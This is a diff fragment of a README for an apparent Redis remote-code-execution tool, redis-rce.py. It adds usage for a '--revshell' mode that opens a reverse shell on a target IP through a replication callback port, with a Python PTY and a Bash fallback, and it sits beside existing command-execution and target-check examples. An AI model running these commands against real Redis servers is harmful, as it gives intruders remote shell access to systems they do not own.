@@ -22,6 +22,15 @@ Interactive command execution:
 python3 redis-rce.py -r 192.168.168.93
 ```
 
+Automatic reverse shell using the proven replication callback port:
+
+```bash
+python3 redis-rce.py -r 192.168.168.93 --revshell
+```
+
+The reverse-shell mode prefers a Python PTY and falls back to Bash. Press
+`Ctrl-]` to disconnect; cleanup runs automatically after the shell closes.
+
 Read-only target check:
 
 ```bash
